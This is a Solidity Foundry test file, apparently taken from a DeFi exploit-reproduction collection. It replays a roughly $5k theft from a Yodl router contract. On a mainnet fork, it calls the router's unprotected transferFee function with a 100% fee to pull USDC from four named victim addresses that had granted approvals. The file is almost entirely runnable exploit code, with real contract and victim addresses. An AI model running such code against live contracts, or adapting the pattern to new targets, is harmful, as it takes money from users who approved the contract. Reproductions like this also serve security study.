// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~5k
// Attacker : https://etherscan.io/address/0xedee6379fe90bd9b85d8d0b767d4a6deb0dc9dcf
// Attack Contract : https://etherscan.io/address/0x802cfff8d7cb27879e00496843bb69361ff09ab3
// Vulnerable Contract : https://etherscan.io/address/0xe3a0bc3483ae5a04db7ef2954315133a6f7d228e
// Attack Tx : https://etherscan.io/tx/0x54f659773dae6e01f83184d4b6d717c7f1bb71c0aa59e8c8f4a57c25271424b3

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xe3a0bc3483ae5a04db7ef2954315133a6f7d228e#code

// @Analysis
// Post-mortem : 
// Twitter Guy : 
// Hacking God : 
pragma solidity ^0.8.0;

interface IR {
    function transferFee(uint256 amount, uint256 feeBps, address token, address from, address to) external;
}

contract NoName is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 20_520_368;
    address internal YodlRouter = 0xE3A0bc3483AE5a04DB7eF2954315133a6F7D228E;
    address internal USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(USDC);
    }

    function testExploit() public balanceLog {
        //implement exploit code here
        uint256 amount;
        uint256 feeBps = 10_000;
        address token = USDC;
        address from;
        address to = address(this);

        // Victim 0
        from = 0x5322BFF39339eDa261Bf878Fa7d92791Cc969Bb0;
        amount = 45_588_747_326;
        IR(YodlRouter).transferFee(amount, feeBps, token, from, to);

        // Victim 1
        from = 0xa7b7d4ebF1F5035F3b289139baDa62f981f2916E;
        amount = 1_219_608_225;
        IR(YodlRouter).transferFee(amount, feeBps, token, from, to);

        // Victim 2
        from = 0x2c349022df145C1a2eD895B5577905e6F1Bc7881;
        amount = 1_000_000_000;
        IR(YodlRouter).transferFee(amount, feeBps, token, from, to);

        // Victim 3
        from = 0x96D0F726FD900E199680277aAaD326fbdebc6BF9;
        amount = 1_000_000;
        IR(YodlRouter).transferFee(amount, feeBps, token, from, to);
    }
}
